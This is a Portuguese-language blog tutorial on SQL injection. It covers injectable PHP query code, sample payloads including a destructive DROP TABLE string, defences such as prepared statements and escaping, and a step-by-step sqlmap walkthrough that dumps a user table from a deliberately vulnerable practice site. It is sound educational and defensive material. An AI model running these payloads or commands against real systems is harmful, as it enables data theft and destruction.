---
published: true
title: Entendendo SQL Injection 
layout: post
abstract: Esse é um artigo explicativo de como funciona o SQL Injection e seu perigo para a segurança da informação, além de como esse problema pode ser contornado facilmente e como testar suas aplicações. Lembre-se que testar aplicações sem a permissão do proprietário é crime!
---

> Esse é um artigo explicativo de como funciona o SQL Injection e seu perigo para a segurança da informação, além de como esse problema pode ser contornado facilmente e como testar suas aplicações. Lembre-se que testar aplicações sem a permissão do proprietário é crime!

----------
* auto-gen TOC:
{:toc}
----------

## Introdução 

O SQL Injection é um ataque à aplicações que consiste em injetar comandos SQL que serão executados na máquina alvo. E isso pode, a princípio, parecer confuso. Mas segundo a OWASP ( Open Web Application Security Project), [Injection representa um dos 10 maiores riscos para aplicações](https://www.owasp.org/index.php/OWASP_Top_Ten_Cheat_Sheet), incluindo aí ataques de SQL Injection, Command Injection e Buffer Overflow.

No entanto, é preocupante que uma aplicação que utiliza banco de dados, o que se resume a praticamente qualquer aplicação atual, possa ser explorada para executar comandos maliciosos arbitrários de um atacante. Em outras palavras, um ataque bem-sucedido poderia inserir e remover tabelas de um banco, ou mesmo enviar dados sensíveis de volta ao atacante, ferindo os [pilares da segurança da informação](https://pt.wikipedia.org/wiki/Seguran%C3%A7a_da_informa%C3%A7%C3%A3o#Conceitos_de_seguran.C3.A7a).

## Como Injetar comandos?

Você deve estar se perguntando: como *exatamente* alguém conseguiria injetar comandos em uma aplicação? Suponha que você escreva sua lista de compras mas mande outra pessoa ao mercado. Sua lista contém apenas um item, e a pessoa irá executar mentalmente a ação `COMPRAR`. Se sua lista contém, por exemplo, `AÇÚCAR`, então a pessoa, ao ler a lista, processaria `COMPRAR AÇÚCAR`. Mas você não está contente com isso, então escreve uma nova lista, contendo a string `AÇÚCAR E CHOCOLATE`. Logo, a pessoa que receber essa lista irá executar o comando de `COMPRAR AÇÚCAR E CHOCOLATE`.

Agora iremos injetar um comando que queremos que seja executado, algo que o programa original não estava preparado para receber. Vamos escrever `AÇÚCAR E PULAR DA JANELA`. O resultado? Bem, `COMPRAR AÇÚCAR E PULAR DA JANELA`. Talvez uma pessoa seja razoável o suficiente para não seguir esse conselho, mas uma mente robótica não pensaria duas vezes.

## Exemplos de Injection em Query

Mesmo que Injection valha para diversos tipos de aplicações e banco de dados, vamos dar uma olhada no SQL (Structured Query Language). Tomemos por exemplo uma query simples de busca:

```sql
SELECT * from tabela_usuarios WHERE usuario=''; 
```

Essa busca retorna todas as colunas da ``tabela_usuarios`` com nome de usuário igual à '' (vazio). No entanto, esse nome de usuário pode vir de uma outra função, como uma caixa de busca preenchida pelo usuário. É comum em muitas implementações as pessoas formarem o query SQL de forma dinâmica, a partir da união de várias strings. Tomemos por exemplo uma implementação rápida em PHP:

```php
<?php

$query = "SELECT * from tabela_usuarios" 
       . "WHERE usuario='" . $usuario . "'";

$result = mysql_query($query);

?>
```

Embora essa implementação funcione, ela é facilmente quebrável. Basta, por exemplo, digitar o caractere `'` na variável ``$usuario``. O resultado será:

```sql
SELECT * from tabela_usuarios WHERE usuario='''; 
```

O que gerará um erro interno no programa, pois a segunda aspa fecha a primeira, mas a terceira não é fechada. Isso geraria um erro interno no programa que deve ser tratado, e nunca exibido para o usuário como muitos sites vulneráveis fazem. Podemos, no entanto, inserir coisas mais interessantes como `' OR '1'='1`. O resultado disso será:

```sql
SELECT * from tabela_usuarios WHERE usuario='' OR '1'='1';
```

Que não só é uma query válida, como retorna todo o conteúdo de ``tabela_usuarios``, pois a condição `'1'='1'` é sempre satisfeita. Já de cara é possível perceber como essa vulnerabilidade é perigosa. Bastaria uma simples busca com a string `'; DROP TABLE tabela_usuarios; --` para que a tabela atual fosse completamente removida, já que os dois traços funcionam como comentário no SQL.

```sql
SELECT * from tabela_usuarios WHERE usuario=''; DROP TABLE tabela_usuarios; --';
```

## Se protegendo de SQL Injection

Não tem jeito: de uma forma ou de outra, se você trabalha com banco de dados, suas aplicações terão que tratar das entradas do usuário, processo conhecido como *sanitizing*.

![xcdc](https://imgs.xkcd.com/comics/exploits_of_a_mom.png)

A OWASP divulga um [manual de métodos de defesa contra SQLi](https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet). Sumarizando, existem três formas principais de proteção: 

### Utilizar métodos prontos da linguagem

Essa é uma metodologia eficaz e muito simples de ser implementada, e deveria ser como todos os programadores aprendem SQL. Ela implica em primeiro escrever todo o código SQL, para depois passar cada parâmetro individualmente. Os campos que devem ser substituídos são formados com wildcards, como o `?`, e depois são substituídos pelas variáveis dentro da função, que já faz as verificações necessárias. Tomemos por exemplo a seguinte implementação em Java do primeiro exemplo:

```java
String query = "SELECT * FROM tabela_usuarias WHERE usuario = ? ";
  
PreparedStatement pstmt = connection.prepareStatement( query );
pstmt.setString( 1, myusuario); 
```

Nessa ocasião, mesmo que o input tivesse caracteres estranhos como o `'`, a busca seria literal, ou seja, a query buscaria uma aspa armazenada no banco de dados.

### Validar dados de entrada manualmente (whitelist)

Essa técnica basicamente visa eliminar os vetores de ataque recusando queries com caracteres suspeitos. Exemplos desse tipo de queries são strings de entrada contendo `1=1`, `<script>` ou mesmo `'`, salvo nos casos onde esses caracteres são legítimos, como apóstrofos em nomes. **Validar a entrada é um método recomendado mesmo quando outros métodos de proteção são utilizados**.

Outra forma de validar dados de entrada de forma automatizada é utilizar **Web Application Firewalls**, ou **WAFs**. O problema com eles, embora sirvam para bloquear grande parte das query maliciosas, é que eles também podem ser enganados, levando a falsos positivos ou, pior, à falsos negativos. Além disso, eles impactam a performance da aplicação pois precisam processar todos os pacotes recebidos.

### Escapar dados de entrada

Consiste em converter dados de entrada em caracteres que não causam problemas. O MySQL, por exemplo, suporta as seguintes conversões:

```
 NUL (0x00) --> \0
 BS  (0x08) --> \b
 TAB (0x09) --> \t
 LF  (0x0a) --> \n
 CR  (0x0d) --> \r
 SUB (0x1a) --> \Z
 "   (0x22) --> \"
 %   (0x25) --> \%
 '   (0x27) --> \'
 \   (0x5c) --> \\
 _   (0x5f) --> \_ 
```

## Testando suas aplicações

Por muitas vezes é difícil testar suas aplicações para todos os vetores de ataque e todos os formulários existentes. Por isso, existem ferramentas automatizadas para teste das aplicações que fazem milhares de testes por segundo. Vamos utilizar o [**sqlmap**](http://sqlmap.org/). O site alvo será o [Hackyourselffirst](https://hackyourselffirst.troyhunt.com), um site dedicado a mostrar esse tipo de vulnerabilidade.

Uma análise inicial mostra que a página utiliza requisições do tipo GET, que provavelmente são dados como instruções ao banco de dados, como na variável `orderby`, diretamente no URL.

```
https://hackyourselffirst.troyhunt.com/Make/1?orderby=1
```

Vamos tentar passar um caractere proibido como o `'` e ver como site responde.

```
https://hackyourselffirst.troyhunt.com/Make/1?orderby='
```

<img src="https://cloud.githubusercontent.com/assets/8211602/26791649/20b548ca-49ee-11e7-8642-8a3d16e50f91.png" style="width: 100%;"/>

Um bom sinal! Os erros não são tratados e pior, são mostrados imediatamente ao usuário, o que significa que a aplicação pode ser vulnerável. Vamos rodar o [**sqlmap**](https://github.com/sqlmapproject/sqlmap) e tentar explorar essa variável. Primeiro, vamos enumerar os bancos da vítima:

```bash
./sqlmap.py --url "http://hackyourselffirst.troyhunt.com/Make/1?orderby=supercarid" --dbs
```

E então ele começa a trabalhar, rodando um teste automatizado que enumera os bancos.

<img src="https://user-images.githubusercontent.com/8211602/33934197-47c0c688-dfdf-11e7-809d-8c1f2d5b7164.png" style="width: 100%;"/>

E, como em um passe de mágica, ele nos retorna a estrutura do bancos de dados!

```
[08:17:00] [INFO] retrieved: hackyourselffirst_db
[08:17:01] [INFO] retrieved: master
[08:17:01] [INFO] retrieved: tempdb
[08:17:02] [INFO] retrieved:  
available databases [3]:
[*] hackyourselffirst_db
[*] master
[*] tempdb
```

Agora que já sabemos qual o banco que vamos atacar, precisamos enumerar as tabelas:

```bash
./sqlmap.py --url "http://hackyourselffirst.troyhunt.com/Make/1?orderby=supercarid" -D hackyourselffirst_db --tables
```

E voalá:

```
[08:30:19] [INFO] fetching tables for database: hackyourselffirst_db
[08:30:19] [INFO] the SQL query used returns 11 entries
[08:30:20] [INFO] retrieved: dbo.Make
[08:30:20] [INFO] retrieved: dbo.Supercar
[08:30:21] [INFO] retrieved: dbo.UserProfile
[08:30:21] [INFO] retrieved: dbo.Vote
[08:30:22] [INFO] retrieved: dbo.webpages_Membership
[08:30:22] [INFO] retrieved: dbo.webpages_OAuthMembership
[08:30:23] [INFO] retrieved: dbo.webpages_Roles
[08:30:23] [INFO] retrieved: dbo.webpages_UsersInRoles
[08:30:24] [INFO] retrieved: sys.database_firewall_rules
[08:30:24] [INFO] retrieved: sys.script_deployment_status
[08:30:25] [INFO] retrieved: sys.script_deployments
Database: hackyourselffirst_db
[11 tables]
+------------------------------+
| Make                         |
| Supercar                     |
| UserProfile                  |
| Vote                         |
| webpages_Membership          |
| webpages_OAuthMembership     |
| webpages_Roles               |
| webpages_UsersInRoles        |
| sys.database_firewall_rules  |
| sys.script_deployment_status |
| sys.script_deployments       |
+------------------------------+
```

Vamos selecionar uma tabela com informações sensitivas, que costumam ser as mais vulneráveis para as empresas porque contém informações de clientes. A tabela `UserProfile` parece ser promissora!

```bash
./sqlmap.py --url "http://hackyourselffirst.troyhunt.com/Make/1?orderby=supercarid" -D hackyourselffirst_db -T UserProfile --columns
```

E, como esperado, essa tabela contém informações relevantes dos usuários:

```
[08:33:21] [INFO] retrieved: Email
[08:33:21] [INFO] retrieved: nvarchar
[08:33:22] [INFO] retrieved: FirstName
[08:33:23] [INFO] retrieved: nvarchar
[08:33:23] [INFO] retrieved: IsAdmin
[08:33:24] [INFO] retrieved: bit
[08:33:24] [INFO] retrieved: LastName
[08:33:25] [INFO] retrieved: nvarchar
[08:33:26] [INFO] retrieved: Password
[08:33:26] [INFO] retrieved: nvarchar
[08:33:27] [INFO] retrieved: UserId
[08:33:27] [INFO] retrieved: int
Database: hackyourselffirst_db
Table: UserProfile
[6 columns]
+-----------+----------+
| Column    | Type     |
+-----------+----------+
| Email     | nvarchar |
| FirstName | nvarchar |
| IsAdmin   | bit      |
| LastName  | nvarchar |
| Password  | nvarchar |
| UserId    | int      |
+-----------+----------+
```

Por fim, vamos fazer um dump de toda a tabela de usuários (porque não?):

```bash
./sqlmap.py --url "http://hackyourselffirst.troyhunt.com/Make/1?orderby=supercarid" -D hackyourselffirst_db -T UserProfile --dump 
```

E toda a tabela agora é nossa:

<img src="https://user-images.githubusercontent.com/8211602/33935028-ae631146-dfe1-11e7-80d6-ccb9f235e84e.png" style="width: 100%;"/>

Agora imagine o que isso implicaria para um site que lida com informações como números de cartões. **Em cinco minutos, todos os dados de todos os usuários poderiam ser obtidos por alguém copiando e colando comandos na tela do computador.** Por isso é tão importante que as empresas tenham o cuidado de manter seus websites sempre seguros. O principal problema aqui é que, caso o administrados não mantivesse ou não prestassem atenção nos logs do seu serviço, ele provavelmente nem saberia que todos os seus dados foram roubados.

Então lembrem-se. **Sempre validem os dados dos usuários!**


